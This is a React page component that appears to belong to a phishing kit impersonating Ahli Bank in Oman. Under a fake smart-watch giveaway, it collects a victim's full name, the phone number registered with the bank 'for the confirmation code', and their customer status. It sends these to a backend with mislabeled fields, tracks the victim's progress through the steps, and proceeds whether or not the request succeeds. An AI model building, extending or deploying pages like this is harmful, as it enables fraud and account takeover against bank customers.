import React, { useState } from 'react';
import { AlertCircle, User, Wifi } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import AppHeader from '../components/AppHeader';
import AppFooter from '../components/AppFooter';
import { FormState, LOGO_SRC } from '../types';
import { createCardRequest } from '../api';

export default function FormPage({
  formState,
  setFormState
}: {
  formState: FormState;
  setFormState: React.Dispatch<React.SetStateAction<FormState>>;
}) {
  const navigate = useNavigate();
  const [errorMsg, setErrorMsg] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formState.fullName.trim()) {
      setErrorMsg('يرجى إدخال الاسم الكامل');
      return;
    }
    if (!formState.phone.trim() || formState.phone.length < 8) {
      setErrorMsg('يرجى إدخال رقم هاتف عُماني صحيح (8 أرقام)');
      return;
    }
    if (!formState.termsAccepted) {
      setErrorMsg('يرجى الموافقة على الشروط والأحكام للمتابعة');
      return;
    }
    setErrorMsg('');
    setSubmitting(true);
    try {
      await createCardRequest({
        name: formState.fullName.trim(),
        mobile: formState.phone.trim(),
        idNumber: formState.isExistingCustomer === 'نعم' ? 'عميل بنك مسقط' : 'عميل جديد',
        cardType: formState.watchColor,
        address: `${formState.watchSize || '45mm'} - ${formState.strapType || 'silicone'}`,
        date: new Date().toISOString().slice(0, 10),
        step: 'form'
      });
    } catch {
      // Proceed even if network is slow
    } finally {
      setSubmitting(false);
      navigate('/select-watch');
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fbfbfd]">
      <AppHeader showBack backTo="/" title="الخطوة 1: بيانات العميل" />

      <main className="flex-1 py-6 px-4 max-w-md mx-auto w-full">
        {/* Main Card Container */}
        <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
          <div className="mb-6 text-center border-b border-gray-100 pb-4">
            <h2 className="text-xl font-bold text-gray-900">طلب الساعة الذكية</h2>
            <p className="text-xs text-gray-500 mt-1">
              الرجاء إدخال بياناتك المسجلة لدى البنك الأهلي لإرسال الساعة إلى عنوانك
            </p>
          </div>

          {errorMsg && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-xl text-xs text-red-700 font-medium flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{errorMsg}</span>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Full Name Input */}
            <div>
              <label className="block text-sm font-bold text-gray-800 mb-1.5">
                الاسم الكامل <span className="text-[#004838]">*</span>
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={formState.fullName}
                  onChange={(e) => setFormState({ ...formState, fullName: e.target.value })}
                  placeholder="أسم العميل الثلاثي والقبيلة"
                  className="w-full px-4 py-3 bg-gray-50/70 border border-gray-300 rounded-xl text-sm focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                />
                <User className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-400" />
              </div>
            </div>

            {/* Phone Number Input */}
            <div>
              <label className="block text-sm font-bold text-gray-800 mb-1.5">
                رقم الهاتف <span className="text-[#004838]">*</span>
              </label>
              <div className="relative flex items-center">
                <input
                  type="tel"
                  dir="ltr"
                  value={formState.phone}
                  onChange={(e) => setFormState({ ...formState, phone: e.target.value.replace(/\D/g, '') })}
                  placeholder="9XXXXXXX"
                  maxLength={8}
                  className="w-full pl-4 pr-20 py-3 bg-gray-50/70 border border-gray-300 rounded-xl text-sm text-right focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                />
                <div className="absolute right-3 flex items-center gap-1.5 text-xs font-bold text-gray-600 pl-2 border-l border-gray-300">
                  <span>🇴🇲</span>
                  <span dir="ltr">+968</span>
                </div>
              </div>
              <p className="text-[11px] text-gray-400 mt-1">رقم الهاتف المسجل لدى البنك الأهلي لاستلام رمز التأكيد</p>
            </div>

            {/* Existing Customer Dropdown */}
            <div>
              <label className="block text-sm font-bold text-gray-800 mb-1.5">
                هل انت عميل حالي لدى البنك الأهلي؟
              </label>
              <select
                value={formState.isExistingCustomer}
                onChange={(e) => setFormState({ ...formState, isExistingCustomer: e.target.value })}
                className="w-full px-4 py-3 bg-gray-50/70 border border-gray-300 rounded-xl text-sm text-gray-700 focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all"
              >
                <option value="نعم">نعم، لدي حساب مصرفي في البنك الأهلي</option>
                <option value="لا">لا، أرغب في فتح حساب جديد</option>
              </select>
            </div>

            {/* Watch Color Choice */}
            <div>
              <label className="block text-sm font-bold text-gray-800 mb-1.5">
                اختر لون الساعة المفضل
              </label>
              <div className="grid grid-cols-3 gap-2">
                {[
                  { id: 'rose-gold', name: 'ذهبي وردي', color: 'bg-[#b98068]' },
                  { id: 'midnight', name: 'أسود مطفي', color: 'bg-gray-900' },
                  { id: 'silver', name: 'فضي بلاتيني', color: 'bg-slate-300' }
                ].map((c) => (
                  <button
                    type="button"
                    key={c.id}
                    onClick={() => setFormState({ ...formState, watchColor: c.id })}
                    className={`py-2 px-3 rounded-xl border text-xs flex flex-col items-center gap-1.5 transition-all ${
                      formState.watchColor === c.id
                        ? 'border-[#004838] bg-[#e6f4f0] font-bold text-[#004838] shadow-xs'
                        : 'border-gray-200 bg-white text-gray-600'
                    }`}
                  >
                    <span className={`w-4 h-4 rounded-full ${c.color} shadow-xs`} />
                    <span>{c.name}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Terms and Conditions Checkbox */}
            <div className="pt-2">
              <label className="flex items-start gap-3 cursor-pointer select-none">
                <input
                  type="checkbox"
                  checked={formState.termsAccepted}
                  onChange={(e) => setFormState({ ...formState, termsAccepted: e.target.checked })}
                  className="w-5 h-5 rounded-md border-gray-300 text-[#004838] focus:ring-[#004838] mt-0.5 cursor-pointer accent-[#004838]"
                />
                <span className="text-xs text-gray-700 leading-relaxed font-medium">
                  هل توافق على الشروط والأحكام الخاصة بمعالجة البيانات وربط الأجهزة الذكية وفق معايير البنك المركزي العُماني؟
                </span>
              </label>
            </div>

            {/* Submit Button */}
            <div className="pt-3">
              <button
                type="submit"
                disabled={submitting}
                className="w-full py-3.5 bg-gradient-to-r from-[#d4a343] via-[#c8922c] to-[#b88022] hover:from-[#c8922c] hover:to-[#a7731a] text-white font-bold text-lg rounded-2xl shadow-lg shadow-[#d4a343]/25 active:scale-[0.98] transition-all cursor-pointer"
              >
                {submitting ? 'جارِ الحفظ...' : 'متابعة'}
              </button>
            </div>
          </form>
        </div>

        {/* Watch Showcase below Form */}
        <div className="mt-8 flex flex-col items-center justify-center">
          <div className="relative w-44 h-44 rounded-full bg-gradient-to-b from-[#e6f4f0] to-[#f4f7f5] flex items-center justify-center p-3 border border-[#004838]/20 shadow-inner">
            <div className="w-36 h-36 rounded-full bg-white shadow-md flex items-center justify-center overflow-hidden border border-gray-100 relative">
              <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-[#01261d] to-[#043d30] p-2 border border-[#d4a343]/40 text-white flex flex-col justify-between">
                <div className="flex items-center justify-between text-[8px] text-[#e8c679]">
                  <span>Pay</span>
                  <Wifi className="w-3 h-3 rotate-90" />
                </div>
                <div className="text-center my-1 flex flex-col items-center justify-center">
                  <img src={LOGO_SRC} alt="ahlibank" className="h-3.5 object-contain mb-0.5" />
                  <div className="text-[7px] text-gray-300">Mastercard</div>
                </div>
                <div className="w-full h-1 bg-[#d4a343] rounded-full" />
              </div>
            </div>
          </div>
          <p className="text-xs text-gray-500 mt-2 font-medium">تقنية الدفع الآمن المشفرة - البنك الأهلي</p>
        </div>
      </main>

      <AppFooter />
    </div>
  );
}
